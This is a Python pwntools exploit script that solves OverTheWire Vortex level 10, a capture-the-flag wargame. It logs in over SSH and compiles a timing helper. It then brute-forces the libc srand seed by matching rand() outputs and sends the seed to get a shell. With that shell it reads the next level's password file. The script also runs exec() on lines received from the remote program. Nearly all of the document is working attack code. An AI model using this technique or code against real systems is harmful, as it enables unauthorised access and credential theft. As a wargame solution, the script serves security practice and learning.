#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
from ctypes import *
context(arch='i386',os='linux')


level    = 10
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)

# Load up some ctypes wooo
cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")

# Run our binary and get a good guess as to what the value might be
shell.set_working_directory()
shell.upload_file('ticks.c')
shell['gcc -O3 ticks.c -o ticks']

# Run our binary and their binary at the same time
# so that the times are closer.
def find_the_seed():
    sh    = shell.run('(./ticks && %s)' % binary)
    exec(sh.recvline()) # seed
    exec(sh.recvline()) # ticks

    log.info("seed: %x" % seed)
    log.info("ticks: %x" % ticks)

    want = sh.recvline().strip()
    want = want.strip('[], ')
    want = want.split(',')
    want = [int('0x'+i.strip(), 16) for i in want]

    log.info("Needle: %s" % want)

    for seed in xrange(seed-0x10000, seed+0x10000):
        libc.srand(seed)
        match = 0
        for i in xrange(0x100):
            rv = libc.rand()
            if rv == want[match]:
                match += 1
            else:
                match = 0

            if match > 15:
                log.success("Found seed: %x" % seed)
                sh.send(p32(seed))
                return sh
    log.info("Didn't find the seed")
    return None

# Search for the seed based off of our guess
# When we find it, send it as a 4-byte packed integer
sh = None
while sh is None:
    sh = find_the_seed()

# Win
sh.sendline('export PS1=""')
sh.clean(2)

sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
